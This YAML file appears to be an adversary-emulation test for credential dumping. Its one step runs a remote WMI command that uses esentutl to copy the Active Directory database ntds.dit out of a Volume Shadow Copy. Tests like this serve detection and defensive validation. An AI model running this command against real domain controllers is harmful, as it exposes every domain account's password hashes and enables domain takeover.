api_version: "2.0"
name: Create Volume Shadow Copy remotely (WMI) with esentutl
description: |
    This test is intended to be run from a remote workstation with domain admin context.
    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.
args:
    - name: source_path
      type: string
      default: c:\windows\ntds\ntds.dit
    - name: target_path
      type: string
      default: c:\ntds.dit
    - name: target_host
      type: string
      default: localhost
uuid: 21c7bf80-3e8b-40fa-8f9d-f5b194ff2865
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.003: NTDS'
requirements:
    platforms:
        - os: windows
steps:
    - name: create-volume-shadow-copy-remotely-(wmi)-with-esentutl
      inline: |
        wmic /node:"{{.Args.target_host}}" process call create "cmd.exe /c esentutl.exe /y /vss {{.Args.source_path}} /d {{.Args.target_path}}"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
